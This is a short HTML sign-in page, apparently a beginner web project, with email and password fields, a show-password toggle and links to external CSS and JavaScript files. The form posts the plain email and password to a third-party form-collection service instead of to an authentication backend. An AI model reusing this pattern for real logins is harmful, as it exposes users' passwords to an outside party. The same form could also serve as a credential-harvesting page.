<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign In</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="signin-box">
    <h2 style="color: aqua;">Sign In</h2>
    <form id="signinForm" action="https://formspree.io/f/xanbjjow" method="POST">
      <label style="color: rgb(249, 83, 11);">Email</label>
      <input type="email" name="email" placeholder="Enter your email" required />

      <label style="color: rgb(249, 83, 11);">Password</label>
      <div class="form-group">
        <input type="password" name="password" id="passwordInput" placeholder="Enter your password" required />
        <button type="button" class="toggle-password" onclick="togglePassword()">Show</button>
      </div>

      <button type="submit" class="submit-btn">Sign In</button>
      <div class="success-message" id="msg"></div>
    </form>
  </div>
  
  <script src="script.js"></script>
</body>
</html>
